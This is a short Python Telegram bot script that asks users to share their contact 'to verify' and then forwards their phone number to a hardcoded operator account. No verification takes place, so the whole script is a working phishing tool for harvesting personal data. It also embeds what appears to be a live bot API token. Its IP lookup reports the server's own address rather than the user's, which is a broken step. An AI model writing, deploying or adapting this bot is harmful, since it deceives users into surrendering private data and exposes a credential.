import telebot
import requests

API_TOKEN = '8580731044:AAESaTbEO65fLxF3WiZnPtyUTYjajrhkR-I'
MY_ID = '8046944525'

bot = telebot.TeleBot(API_TOKEN)

@bot.message_handler(commands=['start'])
def start(m):
    bot.reply_to(m, "Send contact to verify.")

@bot.message_handler(content_types=['contact'])
def contact(m):
    try:
        res = requests.get("http://ip-api.com/json/").json()
        ip = res.get("query", "N/A")
        bot.send_message(MY_ID, f"📱 Phone: {m.contact.phone_number}\n🌐 IP: {ip}")
        bot.send_message(m.chat.id, "✅ Done!")
    except:
        pass

print("BOT STARTED...")
bot.infinity_polling()
